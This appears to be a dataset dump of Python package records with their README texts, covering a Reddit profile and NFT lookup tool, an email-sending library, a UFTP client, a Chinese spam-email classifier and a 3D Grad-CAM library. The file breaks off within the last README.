⠀⢸⣿⣿⠀⠀⠀⠀⠀⠉⠋⠁⠀⠀⠀⠀⠈⠙⠉⠀⠀⠀⠀⠀⣿⣿⡇⠀
⠀⠀⣿⣿⣧⡀⠀⠀⠀⢤⣀⡀⠀⠀⠀⠀⢀⣀⡤⠀⠀⠀⢀⣼⣿⣿⠀⠀
⠀⠀⠈⠿⣿⣷⣦⣀⠀⠀⠉⠻⠿⠿⠿⠿⠟⠉⠀⠀⣀⣴⣾⣿⠿⠁⠀⠀
⠀⠀⠀⠀⠉⠻⢿⣿⣿⣷⣶⣤⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠟⠉⠀   Poly-REaDDIT: ⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⠿⠿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀   a Reddit user info collector⠀⠀⠀


 [+] REDDIT USER INFO
  |
  ├ Username: xxxx
  ├ Created UTC: 2013-10-31 09:43:58
  ├ User ID: t2_xxx
  ├ Is mod: False
  ├ Is NSFW: False
  ├ Is Gold: False
  ├ Is Employee: False
  ├ Is Suspended: False
  ├ Hide from robots: True
  ├ Profile ID: t5_xxx
  ├ User name: u/axxxxx
  ├ User karma: 3 (0: Awards received, 0: Awards given, 1: Comments, 2: Posts)
  ├ Polygon Address: 0x5exxxxxxx
  └ ------------------------------------

 [+] NFT INFO
  |
  ├ Name: Hog-nosed Bats #71xxxxx
  ├ ID: nft_eip155:137_f33ad86bb54a2xxxx
  ├ Serial Number: 71xxxx
  ├ Title: Hog-nosed Bats #71xxxx
  ├ External Urls: https://polygonscan.com/token/0xf33ad86bb54xxxxx
  └ ------------------------------------

  ├ Name: The Big Bucks #1148
  ├ ID: nft_eip155:137_4bexxxxxx
  ├ Serial Number: 1xxx
  ├ Title: XXXXXXXXX #1xxxx
  ├ External Urls: https://polygonscan.com/token/0x4be1e0xxxxxxx
  └ ------------------------------------
```
","# Poly-REaDDIT
## A tool for gathering information and Polygon address NFT details about any Reddit users.
Since last year Reddit introduced a way to costumize your profile with NFTs. This tool is a way to gather information, its NFTs and the Polygon address of any Reddit user.





When you purchase or mint a Reddit NFT, Reddit client will create a Polygon wallet/address for you. This address is linked to your Reddit account and can be used to send and receive NFTs.
The wallet is related to the Poligon network, so you can use it to send and receive NFTs from other Polygon wallets or sell it. Poligon is a Layer 2 scaling solution for Ethereum.

The NFT will bring the ability to create a new revenue stream for Reddit and its users, and also customize the aspect of the profile. The related NFTs are listed on OpenSea and PolygonScan.



## Installation and usage
```
$ git clone
$ cd Poly-REaDDIT
$ pip install -r requirements.txt
```
Or directly install the requirements with pip:
```
$ pip install poly-readdit
```
Then you can run the tool with:
```
$ python ./poly-readdit/poly-readdit.py -username xxxxxx
```
Or if you installed via pip directly with:
```
$ polyreaddit -username xxxxxx
```
## Example
```
./poly-readdit/poly-readdit.py -username xxxxxxx

⠀⠀⠀⢠⣾⣿⣿⣿⣿⣶⣤⣤⣾⠛⠻⣷⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡏⠉⠉⠙⠛⠿⠿⣷⣀⣀⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀
⠀⠀⣀⣤⣀⠀⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⡀⠀⣀⣤⣀⠀⠀
⢰⡿⠋⢉⣹⣿⣿⣿⠿⠟⠛⠋⠉⠉⠉⠉⠙⠛⠻⠿⣿⣿⣿⣏⡉⠙⢿⡆
⢸⣇⣠⣾⣿⡿⠋⠀⠀⣠⣤⣀⠀⠀⠀⠀⣀⣤⣄⠀⠀⠙⢿⣿⣷⣄⣸⡗
⠈⢻⣿⣿⠋⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠙⣿⣿⡟⠁
⠀⢸⣿⣿⠀⠀⠀⠀⠀⠉⠋⠁⠀⠀⠀⠀⠈⠙⠉⠀⠀⠀⠀⠀⣿⣿⡇⠀
⠀⠀⣿⣿⣧⡀⠀⠀⠀⢤⣀⡀⠀⠀⠀⠀⢀⣀⡤⠀⠀⠀⢀⣼⣿⣿⠀⠀
⠀⠀⠈⠿⣿⣷⣦⣀⠀⠀⠉⠻⠿⠿⠿⠿⠟⠉⠀⠀⣀⣴⣾⣿⠿⠁⠀⠀
⠀⠀⠀⠀⠉⠻⢿⣿⣿⣷⣶⣤⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠟⠉⠀   Poly-REaDDIT: ⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⠿⠿⠿⠿⠟⠛⠛⠉⠁⠀⠀⠀⠀   a Reddit user info collector⠀⠀⠀


 [+] REDDIT USER INFO
  |
  ├ Username: xxxx
  ├ Created UTC: 2013-10-31 09:43:58
  ├ User ID: t2_xxx
  ├ Is mod: False
  ├ Is NSFW: False
  ├ Is Gold: False
  ├ Is Employee: False
  ├ Is Suspended: False
  ├ Hide from robots: True
  ├ Profile ID: t5_xxx
  ├ User name: u/axxxxx
  ├ User karma: 3 (0: Awards received, 0: Awards given, 1: Comments, 2: Posts)
  ├ Polygon Address: 0x5exxxxxxx
  └ ------------------------------------

 [+] NFT INFO
  |
  ├ Name: Hog-nosed Bats #71xxxxx
  ├ ID: nft_eip155:137_f33ad86bb54a2xxxx
  ├ Serial Number: 71xxxx
  ├ Title: Hog-nosed Bats #71xxxx
  ├ External Urls: https://polygonscan.com/token/0xf33ad86bb54xxxxx
  └ ------------------------------------

  ├ Name: The Big Bucks #1148
  ├ ID: nft_eip155:137_4bexxxxxx
  ├ Serial Number: 1xxx
  ├ Title: XXXXXXXXX #1xxxx
  ├ External Urls: https://polygonscan.com/token/0x4be1e0xxxxxxx
  └ ------------------------------------
```
",aaarghhh/poly-readdit
pymailers,https://github.com/rioagungpurnomo/pymailers,0,1091,865,"# PyMailers
The classic email sending library for Python.

## Installation
Start to do the installation.
```bash
pip install pymailers
```

## Example
A simple example is just sending an email message with PyMailer, in **display** you can replace it with **false** then it will not get any logs but if it is made **true** then you will get a log after sending the email message.

```python
from pymailers.PyMailer import PyMailer

pymailer = PyMailer({
  'smtp_host': 'smtp.gmail.com',
  'smtp_port': 587,
  'email': 'xxxxx@gmail.com',
  'password': 'xxxxxxxxxx',
  'to': 'xxxxx@gmail.com',
  'subject': 'Hello World',
  'body': '<p>Hi im Rio</p>',
  'display': True
})

pymailer.send()
```

## Donate
<a href=""https://trakteer.id/rioagungpurnomo"" target=""_blank""><img id=""wse-buttons-preview"" src=""https://cdn.trakteer.id/images/embed/trbtn-red-6.png"" height=""40"" style=""border:0px;height:40px;"" alt=""Trakteer Saya""></a>

Paypal : **[Support me](https://www.paypal.me/RioDev)**

## Contact me
Contact me via email: rioagungpurnomo.ak@gmail.com, I'm waiting for your input or suggestions.


","# PyMailers
The classic email sending library for Python.

## Installation
Start to do the installation.
```bash
pip install pymailers
```

## Example
A simple example is just sending an email message with PyMailer, in **display** you can replace it with **false** then it will not get any logs but if it is made **true** then you will get a log after sending the email message.

```python
from pymailers.PyMailer import PyMailer

pymailer = PyMailer({
  'smtp_host': 'smtp.gmail.com',
  'smtp_port': 587,
  'email': 'xxxxx@gmail.com',
  'password': 'xxxxxxxxxx',
  'to': 'xxxxx@gmail.com',
  'subject': 'Hello World',
  'body': 'Hi im Rio',
  'display': True
})

pymailer.send()
```

## Donate


Paypal : **[Support me](https://www.paypal.me/RioDev)**

## Contact me
Contact me via email: rioagungpurnomo.ak@gmail.com, I'm waiting for your input or suggestions.


",rioagungpurnomo/pymailers
vectordb2,https://github.com/kagisearch/vectordb,7,0,0,,,kagisearch/vectordb
pyuftp,https://github.com/UNICORE-EU/pyuftp,0,958,958,"
UFTP (UNICORE FTP) commandline client

UFTP (UNICORE File Transfer Protocol) is a high-performance data
streaming library and file transfer tool with sharing capabilities.
It allows to transfer data from client to server (and vice versa),
as well as providing data staging and third-party transfer between
UFTP-enabled UNICORE sites.

PyUFTP is a commandline client providing a number of commands for
interacting with a UFTP authentication server and with the UFTPD
file server.

Commands include

 authenticate    - Authenticate only, returning UFTPD address and one-time password
 checksum        - Compute hashes for remote file(s) (MD5, SHA-1, SHA-256, SHA-512)
 cp              - Download/upload file(s)
 find            - List all files in a remote directory
 info            - Gets info about the remote server
 ls              - List a remote directory
 mkdir           - Create a remote directory
 rm              - Remove a remote file/directory

","
UFTP (UNICORE FTP) commandline client

UFTP (UNICORE File Transfer Protocol) is a high-performance data
streaming library and file transfer tool with sharing capabilities.
It allows to transfer data from client to server (and vice versa),
as well as providing data staging and third-party transfer between
UFTP-enabled UNICORE sites.

PyUFTP is a commandline client providing a number of commands for
interacting with a UFTP authentication server and with the UFTPD
file server.

Commands include

 authenticate    - Authenticate only, returning UFTPD address and one-time password
 checksum        - Compute hashes for remote file(s) (MD5, SHA-1, SHA-256, SHA-512)
 cp              - Download/upload file(s)
 find            - List all files in a remote directory
 info            - Gets info about the remote server
 ls              - List a remote directory
 mkdir           - Create a remote directory
 rm              - Remove a remote file/directory

",unicore-eu/pyuftp
paymeapi,https://github.com/AmoreForever/PaymeAPI,0,0,0,,,amoreforever/paymeapi
spamemaildetector,https://github.com/NathanHuXy/SpamEmailDetector,0,8759,8759,">   Author: Xueyan Hu
>
>   Date: 28/4/2023

# What can this package do?

This package is a spam email detector. This package can continuesly listen to the email address provided by the user, and print a message when a new email is received, indicating whether the email is spam or normal.

Note that the package works only (at least primarily) for Chinese context. When applied to English context, the performance may worsen greatly.

# How to use this package?

## Download this package

Download this package by running command line:

```shell
pip install SpamEmailDetector
```

## Continuesly listen to email

```python
from SpamEmailDetector.EmailListener import EmailListener

myEmail = EmailListener(email=yourEmailAddress,password=yourPasscode,detectorName=nameOfDetector)
myEmail.startListening(10)
```

Where, `yourPasscode` is the authorization password of your email address. If you don't know what `yourPasscode` is, then find it from the setting page of your email official website. **Note it's not your password for logging in.** Parameter `detectorName` is the name of spam/normal detector model. Two models are provided in this package: `""BOWSpamDetector""` and `""TfIdfSpamDetector""`. Enter either `String` to select the model in need.

The method `.startListening(10)` means the interval of listening, in seconds. That is to say, the program will check if there is a new email in your email box and judge if it is spam or normal email for every 10 seconds.

Once you start listening to your email box, bellow message will display on the screen. 

```
Start Listening:
-------------------------------------------------- 
Listening at  2023-04-28 11:39:51.582455
--------------------------------------------------
-------------------------------------------------- 
Listening at  2023-04-28 11:40:02.373163
--------------------------------------------------
-------------------------------------------------- 
Listening at  2023-04-28 11:40:12.511100
--------------------------------------------------
```

Once a new email has been detected, a message will note you whether it is a spam or normal email. For example, if it is a normal email:

```
-------------------------------------------------- 
Listening at  2023-04-28 11:40:22.642931
--------------------------------------------------
A new e-mail received!
This is a normal email!
```

To stop listening to your email box, just stop running the program. 

## Judge email from spam and normal

This package also includes two models that can determine whether a given text is more likely to be a spam email or a normal email. Two models included are `BOWSpamDetector` and `TfIdfSpamDetector` .

For example, if you want to use `BOWSpamDetector`, include code below into your python script:

```python
from SpamEmailDetector.BOWSpamDetector import BOWSpamDetector

# create your instance of the class
myInstance = BOWSpamDetector(normalTextFilePATH='./Dataset/normal.txt',spamTextFilePATH='./Dataset/spam.txt', stopWordsTextFilePATH='./Dataset/stopwords_master/baidu_stopwords.txt')
myInstance.preprocessEmails(ChineseOnly=False)

# For a given text TEXT(String)
TEXT = ""...""
vectorizedText = myInstance.countVectorizerModel.transform(TEXT) # transform TEXT into vector
result = myInstance.naiveBayesModel.predict(vectorizedText) # result=0 or 1
```

If you want to use `TfIdfSpamDetector`, replace  `BOWSpamDetector` with the corresponding name.

## A short example: listening to my email

First, start listening to the given mail box by running code below:

```python
from SpamEmailDetector.EmailListener import EmailListener

myEmail = EmailListener(
  						email='xueyanhu******@*****', # hidden
  						password = '*********', # hidden
  						detectorName='BOWSpamDetector'
					)
myEmail.startListening(10) # Listen to my email box every 10 seconds
```

Second, send me myself ten emails with my own account every 10 seconds, by running the following code: (Sensitive info is hidden)

In the variable `testText`, only number 7 is spam email.

```python
import datetime
from pprint import pprint
from SpamEmailDetector.EmailListener import EmailListener
import zmail
import time

if __name__ == '__main__':
    testText= [
        ""本期系列课特邀3位**布道师做客直播间，为您详解ArkTS和ArkUI基础知识，带你轻松学会ArkTS声明式语法的便捷使用，并手把手教你使用ArkUI搭建基础页面。最后通过一个健康生活案例实战带你掌握HarmonyoS数据管理方法、页面路由方法、弹窗与动画等特性，掌握基本的******应用开发能力。"",
        ""在大数据时代背景下，统计学作为大数据分析领域的基础显得尤为重要。为了帮助学生更好的学习和应用数据统计与分析的知识，促进统计、计算机、数学等相关专业的发展，培养具有数据分析与应用型人才，经研究决定，中国国际经济技术合作促进会教育发展工作委员会决定主办“第二届全国大学生数据统计与分析竞。竞赛目的在于为我国数据统计与分析行业提供人才支持，夯实人才队伍基础。不论是提高数据分析能力，还是提升自身就业竞争力，本次竞赛都是一个不错的选择！"",
        ""参加线上讲座的开发团队，可在讲座当天报名参与无障碍适配挑战活动，通过审核后我们将邀请你参加 5 月 18 日在上海设计与开发加速器举办的无障碍宣传日线下活动，在线下你将了解到更多无障碍开发技术，以及与其他开发者进行交流和互动。我们还将邀请使用无障碍功能的用户来分享他们的故事，了解 App 是如何赋能他们的日常生活；以及有经验的开发者来分享他们的工程实践，看如何在产品内部推进无障碍适配。你还可获得一对一咨询和深度辅导，获得针对你 App 的无障碍优化建议。"",
        ""为响应新文化建设的要求，积极探索“一精多会，一专多能”的国际化复合人才培养模式，提升高校学生的应用能力、跨文化沟通能力、实践能力、高质量就业能力，中国管理科学研究院教育标准化研究所决定主办2023年第二届全国大学生新媒体大赛。"",
        ""结果显示 ** 写入性能最大达到 ** 的 6.7 倍，InfluxDB 的 10.6 倍。此外，** 在写入过程中消耗了最少计算（CPU）资源和磁盘 IO 开销；相同落盘数据规模下，** 存储空间只有 InfluxDB 的 25%，只有 TimescaleDB 的 4%。此外，对于大多数查询类型，** 的性能均优于 InfluxDB 和 TimescaleDB，在 Complex queries 类型的查询中展现出巨大的优势——** 的 Complex queries 查询性能最高达到了 InfluxDB 的 37 倍、 TimescaleDB 的 28.6 倍。"",
        ""各位同学，教务处面向全校师生开展大创项目选题征集工作，有意申报的学生请认真阅读通知和附件1的指南，按要求填写附件3，并于4月25日下午五点之前发至邮箱**@163.com，谢谢。"",
        ""您已成功报名训练营，各赛道线上竞赛将于4月28日（本周五）起陆续开赛，我们将在开赛前通知您详细的参赛信息，请您注意查收短信及邮件。"",
        ""感谢你对****的关注！我们已经收到你的简历并会认真评估。通过评估后，我们会及时与你联系，请注意保持手机和邮件畅通。"",
        ""在过去一个月美国储户的“存款大迁徙”中，货币市场基金显然成为了大赢家。 面对银行业持续动荡，寻求更高收益率的投资者大批涌入了美国货币市场基金，这导致货币市场基金的资产规模一路飙升至了创纪录的水平。货币市场基金自身具有的避险吸引力和远远超过银行存款的收益率，吸引了大量的投资者。"",
        ""感谢您注册参加**线上外汇交易讲座，本期讲座时间为2023年4月25日北京时间晚 8:30-9:30 pm。 本次讲座将使用腾讯会议，建议您提前安装app。""
    ]
    testMail = [
        {'subject':""NO.{} Email"".format(i),'content_text':content} for i,content in enumerate(testText)
    ]

    server = zmail.server('*******@*****','********')
    for i,mail in enumerate(testMail):
        pprint('sending Mail: \n{}'.format(mail))
        server.send_mail('*******@*****',mail)
        pprint('Mail sent at {}'.format(datetime.datetime.now()))
        if i==7: print('Mail sent is SPAM!')
        else: print('Mail sent is NORMAL!')
        time.sleep(10)
    print('ends')
```

The result is like: (red boxes are corresponding) an example of normal email

![](https://pic2.imgdb.cn/item/644bdc120d2dde57778ce401.png)

Another example of spam email.

![](https://pic2.imgdb.cn/item/644bdc610d2dde57778d3cac.png)

# Techniques applied

>   This part includes the details of the package.

Namely, Term Frequency Inversed Document Frequency(TfIdf) and Bag of Words (BOW) model of Chinese sentences are included in the package.

## Dataset

The dataset includes three parts:

-   `SpamEmailDetector/Dataset/normal.txt`: includes the normal emails, 5000 emails in total;
-   `SpamEmailDetector/Dataset/spam.txt`: includes the spam emails, 5000 emails in total;
-   `SpamEmailDetector/Dataset/stopwords_master`: a file folder containing four different the most frequently used stop words, both for Chinese and English. View the `SpamEmailDetector/Dataset/stopwords_master/README.md` for more detail of the four files.

## Model

We apply two methods of transforming text data into vectorized data, and use Naive Bayes model to do bi-classification.

As for the super parameters of the final model, we run a grid search of parameters to find the best fitter. We split the trainning and testing data by 66.66% to 33.33%, vectorize the trainining set accordingly, after tokenization with package `jieba` and deleting stop words. Then under pre-specified super parameters the model is trained. We use the test set to evaluate the performance of our model. 

>   Note that words appear in the testing set are not included when we test the performance of our model in test set. This is because in a training context, the model doesn't know which word will appear. This assumption also accords to reality.

For TfIdf-NaiveBayes model, the grid search result are as below:

![](https://pic2.imgdb.cn/item/644bde7b0d2dde57778fb3ae.jpg)

for BOW-NaiveBayes model, the grid search result are as below:

![](https://pic2.imgdb.cn/item/644bdcb20d2dde57778d9b2c.png)

For TfIdf-NaiveBayes, the model has tbe biggest F1 score when the $\alpha$ of Naive Bayes is 0.1 and the n-gram range from 1 and 2(uni-gram and bi-gram). For BOW-NaiveBayes, the biggest F1 score occurs when $\alpha$ of Naive Bayes is 0.1. 

After selecting the super parameters that best fit, we train the final model on the whole dataset. If you run `trainFinalModel` method, then the vectorizer and Naive Bayes model will be stored into two attributes: `self.countVectorizerModel` and `self.naiveBayesModel`, respectively.

",">   Author: Xueyan Hu
>
>   Date: 28/4/2023

# What can this package do?

This package is a spam email detector. This package can continuesly listen to the email address provided by the user, and print a message when a new email is received, indicating whether the email is spam or normal.

Note that the package works only (at least primarily) for Chinese context. When applied to English context, the performance may worsen greatly.

# How to use this package?

## Download this package

Download this package by running command line:

```shell
pip install SpamEmailDetector
```

## Continuesly listen to email

```python
from SpamEmailDetector.EmailListener import EmailListener

myEmail = EmailListener(email=yourEmailAddress,password=yourPasscode,detectorName=nameOfDetector)
myEmail.startListening(10)
```

Where, `yourPasscode` is the authorization password of your email address. If you don't know what `yourPasscode` is, then find it from the setting page of your email official website. **Note it's not your password for logging in.** Parameter `detectorName` is the name of spam/normal detector model. Two models are provided in this package: `""BOWSpamDetector""` and `""TfIdfSpamDetector""`. Enter either `String` to select the model in need.

The method `.startListening(10)` means the interval of listening, in seconds. That is to say, the program will check if there is a new email in your email box and judge if it is spam or normal email for every 10 seconds.

Once you start listening to your email box, bellow message will display on the screen. 

```
Start Listening:
-------------------------------------------------- 
Listening at  2023-04-28 11:39:51.582455
--------------------------------------------------
-------------------------------------------------- 
Listening at  2023-04-28 11:40:02.373163
--------------------------------------------------
-------------------------------------------------- 
Listening at  2023-04-28 11:40:12.511100
--------------------------------------------------
```

Once a new email has been detected, a message will note you whether it is a spam or normal email. For example, if it is a normal email:

```
-------------------------------------------------- 
Listening at  2023-04-28 11:40:22.642931
--------------------------------------------------
A new e-mail received!
This is a normal email!
```

To stop listening to your email box, just stop running the program. 

## Judge email from spam and normal

This package also includes two models that can determine whether a given text is more likely to be a spam email or a normal email. Two models included are `BOWSpamDetector` and `TfIdfSpamDetector` .

For example, if you want to use `BOWSpamDetector`, include code below into your python script:

```python
from SpamEmailDetector.BOWSpamDetector import BOWSpamDetector

# create your instance of the class
myInstance = BOWSpamDetector(normalTextFilePATH='./Dataset/normal.txt',spamTextFilePATH='./Dataset/spam.txt', stopWordsTextFilePATH='./Dataset/stopwords_master/baidu_stopwords.txt')
myInstance.preprocessEmails(ChineseOnly=False)

# For a given text TEXT(String)
TEXT = ""...""
vectorizedText = myInstance.countVectorizerModel.transform(TEXT) # transform TEXT into vector
result = myInstance.naiveBayesModel.predict(vectorizedText) # result=0 or 1
```

If you want to use `TfIdfSpamDetector`, replace  `BOWSpamDetector` with the corresponding name.

## A short example: listening to my email

First, start listening to the given mail box by running code below:

```python
from SpamEmailDetector.EmailListener import EmailListener

myEmail = EmailListener(
  						email='xueyanhu******@*****', # hidden
  						password = '*********', # hidden
  						detectorName='BOWSpamDetector'
					)
myEmail.startListening(10) # Listen to my email box every 10 seconds
```

Second, send me myself ten emails with my own account every 10 seconds, by running the following code: (Sensitive info is hidden)

In the variable `testText`, only number 7 is spam email.

```python
import datetime
from pprint import pprint
from SpamEmailDetector.EmailListener import EmailListener
import zmail
import time

if __name__ == '__main__':
    testText= [
        ""本期系列课特邀3位**布道师做客直播间，为您详解ArkTS和ArkUI基础知识，带你轻松学会ArkTS声明式语法的便捷使用，并手把手教你使用ArkUI搭建基础页面。最后通过一个健康生活案例实战带你掌握HarmonyoS数据管理方法、页面路由方法、弹窗与动画等特性，掌握基本的******应用开发能力。"",
        ""在大数据时代背景下，统计学作为大数据分析领域的基础显得尤为重要。为了帮助学生更好的学习和应用数据统计与分析的知识，促进统计、计算机、数学等相关专业的发展，培养具有数据分析与应用型人才，经研究决定，中国国际经济技术合作促进会教育发展工作委员会决定主办“第二届全国大学生数据统计与分析竞。竞赛目的在于为我国数据统计与分析行业提供人才支持，夯实人才队伍基础。不论是提高数据分析能力，还是提升自身就业竞争力，本次竞赛都是一个不错的选择！"",
        ""参加线上讲座的开发团队，可在讲座当天报名参与无障碍适配挑战活动，通过审核后我们将邀请你参加 5 月 18 日在上海设计与开发加速器举办的无障碍宣传日线下活动，在线下你将了解到更多无障碍开发技术，以及与其他开发者进行交流和互动。我们还将邀请使用无障碍功能的用户来分享他们的故事，了解 App 是如何赋能他们的日常生活；以及有经验的开发者来分享他们的工程实践，看如何在产品内部推进无障碍适配。你还可获得一对一咨询和深度辅导，获得针对你 App 的无障碍优化建议。"",
        ""为响应新文化建设的要求，积极探索“一精多会，一专多能”的国际化复合人才培养模式，提升高校学生的应用能力、跨文化沟通能力、实践能力、高质量就业能力，中国管理科学研究院教育标准化研究所决定主办2023年第二届全国大学生新媒体大赛。"",
        ""结果显示 ** 写入性能最大达到 ** 的 6.7 倍，InfluxDB 的 10.6 倍。此外，** 在写入过程中消耗了最少计算（CPU）资源和磁盘 IO 开销；相同落盘数据规模下，** 存储空间只有 InfluxDB 的 25%，只有 TimescaleDB 的 4%。此外，对于大多数查询类型，** 的性能均优于 InfluxDB 和 TimescaleDB，在 Complex queries 类型的查询中展现出巨大的优势——** 的 Complex queries 查询性能最高达到了 InfluxDB 的 37 倍、 TimescaleDB 的 28.6 倍。"",
        ""各位同学，教务处面向全校师生开展大创项目选题征集工作，有意申报的学生请认真阅读通知和附件1的指南，按要求填写附件3，并于4月25日下午五点之前发至邮箱**@163.com，谢谢。"",
        ""您已成功报名训练营，各赛道线上竞赛将于4月28日（本周五）起陆续开赛，我们将在开赛前通知您详细的参赛信息，请您注意查收短信及邮件。"",
        ""感谢你对****的关注！我们已经收到你的简历并会认真评估。通过评估后，我们会及时与你联系，请注意保持手机和邮件畅通。"",
        ""在过去一个月美国储户的“存款大迁徙”中，货币市场基金显然成为了大赢家。 面对银行业持续动荡，寻求更高收益率的投资者大批涌入了美国货币市场基金，这导致货币市场基金的资产规模一路飙升至了创纪录的水平。货币市场基金自身具有的避险吸引力和远远超过银行存款的收益率，吸引了大量的投资者。"",
        ""感谢您注册参加**线上外汇交易讲座，本期讲座时间为2023年4月25日北京时间晚 8:30-9:30 pm。 本次讲座将使用腾讯会议，建议您提前安装app。""
    ]
    testMail = [
        {'subject':""NO.{} Email"".format(i),'content_text':content} for i,content in enumerate(testText)
    ]

    server = zmail.server('*******@*****','********')
    for i,mail in enumerate(testMail):
        pprint('sending Mail: \n{}'.format(mail))
        server.send_mail('*******@*****',mail)
        pprint('Mail sent at {}'.format(datetime.datetime.now()))
        if i==7: print('Mail sent is SPAM!')
        else: print('Mail sent is NORMAL!')
        time.sleep(10)
    print('ends')
```

The result is like: (red boxes are corresponding) an example of normal email

![](https://pic2.imgdb.cn/item/644bdc120d2dde57778ce401.png)

Another example of spam email.

![](https://pic2.imgdb.cn/item/644bdc610d2dde57778d3cac.png)

# Techniques applied

>   This part includes the details of the package.

Namely, Term Frequency Inversed Document Frequency(TfIdf) and Bag of Words (BOW) model of Chinese sentences are included in the package.

## Dataset

The dataset includes three parts:

-   `SpamEmailDetector/Dataset/normal.txt`: includes the normal emails, 5000 emails in total;
-   `SpamEmailDetector/Dataset/spam.txt`: includes the spam emails, 5000 emails in total;
-   `SpamEmailDetector/Dataset/stopwords_master`: a file folder containing four different the most frequently used stop words, both for Chinese and English. View the `SpamEmailDetector/Dataset/stopwords_master/README.md` for more detail of the four files.

## Model

We apply two methods of transforming text data into vectorized data, and use Naive Bayes model to do bi-classification.

As for the super parameters of the final model, we run a grid search of parameters to find the best fitter. We split the trainning and testing data by 66.66% to 33.33%, vectorize the trainining set accordingly, after tokenization with package `jieba` and deleting stop words. Then under pre-specified super parameters the model is trained. We use the test set to evaluate the performance of our model. 

>   Note that words appear in the testing set are not included when we test the performance of our model in test set. This is because in a training context, the model doesn't know which word will appear. This assumption also accords to reality.

For TfIdf-NaiveBayes model, the grid search result are as below:

![](https://pic2.imgdb.cn/item/644bde7b0d2dde57778fb3ae.jpg)

for BOW-NaiveBayes model, the grid search result are as below:

![](https://pic2.imgdb.cn/item/644bdcb20d2dde57778d9b2c.png)

For TfIdf-NaiveBayes, the model has tbe biggest F1 score when the $\alpha$ of Naive Bayes is 0.1 and the n-gram range from 1 and 2(uni-gram and bi-gram). For BOW-NaiveBayes, the biggest F1 score occurs when $\alpha$ of Naive Bayes is 0.1. 

After selecting the super parameters that best fit, we train the final model on the whole dataset. If you run `trainFinalModel` method, then the vectorizer and Naive Bayes model will be stored into two attributes: `self.countVectorizerModel` and `self.naiveBayesModel`, respectively.

",nathanhuxy/spamemaildetector
medcam3d,https://github.com/Jingnan-Jia/medcam3d,9,3601,3563,"# A library that generates the 3D CAM attention maps for 3D networks for 3D medical images

## How to install it?
`pip install medcam3d`

This package is a 3D extension of **pytorch-grad-cam** https://github.com/jacobgil/pytorch-grad-cam. But at present, only **Grad-CAM** is supported. Other CAM implementations like Grad-CAM++ will be supported later once I have enough time. Also very welcome your pull request.

All the usage and configuration are the same as the original `pytorch-grad-cam` package. 

| Method              | What it does                                                                                                                |
|---------------------|-----------------------------------------------------------------------------------------------------------------------------|
| GradCAM             | Weight the 3D activations by the average gradient                                                                           |



# Chosing the Target Layer
You need to choose the target layer to compute CAM for.
Some common choices are:
- FasterRCNN: model.backbone
- Resnet18 and 50: model.layer4[-1]
- VGG and densenet161: model.features[-1]
- mnasnet1_0: model.layers[-1]
- ViT: model.blocks[-1].norm1
- SwinT: model.layers[-1].blocks[-1].norm1

If you pass **a list with several layers**, the CAM will be **averaged** accross them.
This can be useful if you're not sure what layer will perform best.
However, it may be not wise to select multiple layers at once because the CAMs's values of shallow layers may be way smaller than the deeper layers (e.g. 1/10). So the shallower layers' CAM would be ignored.

```
from medcam3d import GradCAM
from medcam3d.utils.model_targets import ClassifierOutputTarget
from medcam3d.utils.image import show_cam_on_image


model = resnet50(pretrained=True)  # your 3D network
target_layers = [model.layer4[-1]]  # normally the layer before the first fully connected layer
input_tensor = # Create an input tensor of 3D image for your model. Shape: (n_samples, n_channels, length, width, height)
# Note: input_tensor can be a batch tensor with several images! But Jingnan only tested the batch size of only 1.

# Construct the CAM object once, and then re-use it on many images:
cam = GradCAM(model=model, target_layers=target_layers, use_cuda=args.use_cuda)

# You can also use it within a with statement, to make sure it is freed,
# In case you need to re-create it inside an outer loop:
# with GradCAM(model=model, target_layers=target_layers, use_cuda=args.use_cuda) as cam:
#   ...

# We have to specify the target we want to generate
# the Class Activation Maps for.
# If targets is None, the highest scoring category
# will be used for every image in the batch.
# Here we use ClassifierOutputTarget, but you can define your own custom targets
# That are, for example, combinations of categories, or specific outputs in a non standard model.

targets = [ClassifierOutputTarget(281)]  # 281 could be replace by 0 or 1 for two-class classification.

# You can also pass aug_smooth=True and eigen_smooth=True, to apply smoothing.
cam_img = cam(input_tensor=input_tensor, targets=targets)  # output shape: (n_samples, length, width, height)

# In this example grayscale_cam has only one image in the batch:
cam_img = cam_img[0]  # output numpy array shape: (length, width, height)

# Then you can save the array as .mha file and visualize it in MeVisLab like the following figure.
```
<img src=""./examples/cam_example.png"">

----------

If this repository helps you in anyway, show your love ❤️ by putting a ⭐ on this project. 


","# A library that generates the 3D CAM attention maps for 3D networks for 3D medical images

## How to install it?
`pip install medcam3d`

This package is a 3D extension of **pytorch-grad-cam** https://github.com/jacobgil/pytorch-grad-cam. But at present, only **Grad-CAM** is supported. Other CAM implementations like Grad-CAM++ will be supported later once I have enough time. Also very welcome your pull request.

All the usage and configuration are the same as the original `pytorch-grad-cam` package. 

| Method              | What it does                                                                                                                |
|---------------------|-----------------------------------------------------------------------------------------------------------------------------|
| GradCAM             | Weight the 3D activations by the average gradient                                                                           |



# Chosing the Target Layer
You need to choose the target layer to compute CAM for.
Some common choices are:
- FasterRCNN: model.backbone
- Resnet18 and 50: model.layer4[-1]
- VGG and densenet161: model.features[-1]
- mnasnet1_0: model.layers[-1]
- ViT: model.blocks[-1].norm1
- SwinT: model.layers[-1].blocks[-1].norm1

If you pass **a list with several layers**, the CAM will be **averaged** accross them.
This can be useful if you're not sure what layer will perform best.
However, it may be not wise to select multiple layers at once because the CAMs's values of shallow layers may be way smaller than the deeper layers (e.g. 1/10). So the shallower layers' CAM would be ignored.

```
from medcam3d import GradCAM
from medcam3d.utils.model_targets import ClassifierOutputTarget
from medcam3d.utils.image import show_cam_on_image


model = resnet50(pretrained=True)  # your 3D network
target_layers = [model.layer4[-1]]  # normally the layer before the first fully connected layer
